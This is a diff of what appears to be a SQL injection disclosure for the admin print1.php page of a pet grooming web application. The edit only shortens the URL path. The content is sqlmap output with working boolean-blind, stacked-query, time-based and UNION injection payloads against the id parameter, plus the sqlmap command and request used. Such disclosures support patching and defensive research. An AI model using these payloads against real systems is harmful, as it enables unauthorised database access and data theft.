@@ -60,22 +60,22 @@
 Parameter: #1* (URI)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
-    Payload: http://127.0.0.1/pet_grooming/admin/print1.php?id=' AND 8097=(SELECT (CASE WHEN (8097=8097) THEN 8097 ELSE (SELECT 8193 UNION SELECT 9429) END))-- oJLZ
+    Payload: http://127.0.0.1/admin/print1.php?id=' AND 8097=(SELECT (CASE WHEN (8097=8097) THEN 8097 ELSE (SELECT 8193 UNION SELECT 9429) END))-- oJLZ
     Vector: AND [RANDNUM]=(SELECT (CASE WHEN ([INFERENCE]) THEN [RANDNUM] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))[GENERIC_SQL_COMMENT]
 
     Type: stacked queries
     Title: MySQL >= 5.0.12 stacked queries (comment)
-    Payload: http://127.0.0.1/pet_grooming/admin/print1.php?id=';SELECT SLEEP(5)#
+    Payload: http://127.0.0.1/admin/print1.php?id=';SELECT SLEEP(5)#
     Vector: ;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])#
 
     Type: time-based blind
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: http://127.0.0.1/pet_grooming/admin/print1.php?id=' AND (SELECT 6055 FROM (SELECT(SLEEP(5)))Xkso)-- XqjD
+    Payload: http://127.0.0.1/admin/print1.php?id=' AND (SELECT 6055 FROM (SELECT(SLEEP(5)))Xkso)-- XqjD
     Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 18 columns
-    Payload: http://127.0.0.1/pet_grooming/admin/print1.php?id=' UNION ALL SELECT NULL,NULL,CONCAT(0x7170706271,0x76534756724141484c764f55575a65756c6f4875526f7164634b55514270614e74554b4c4a697544,0x716b717671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+    Payload: http://127.0.0.1/admin/print1.php?id=' UNION ALL SELECT NULL,NULL,CONCAT(0x7170706271,0x76534756724141484c764f55575a65756c6f4875526f7164634b55514270614e74554b4c4a697544,0x716b717671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
     Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
 ```
 
@@ -88,7 +88,7 @@ Parameter: #1* (URI)
 ```
 sqlmap -r 1.req  --dbs -v 3 --batch --level 5
 //1.req
-GET /pet_grooming/admin/print1.php?id=* HTTP/1.1
+GET /admin/print1.php?id=* HTTP/1.1
 Host: 127.0.0.1
 sec-ch-ua: "Chromium";v="117", "Not;A=Brand";v="8"
 sec-ch-ua-mobile: ?0
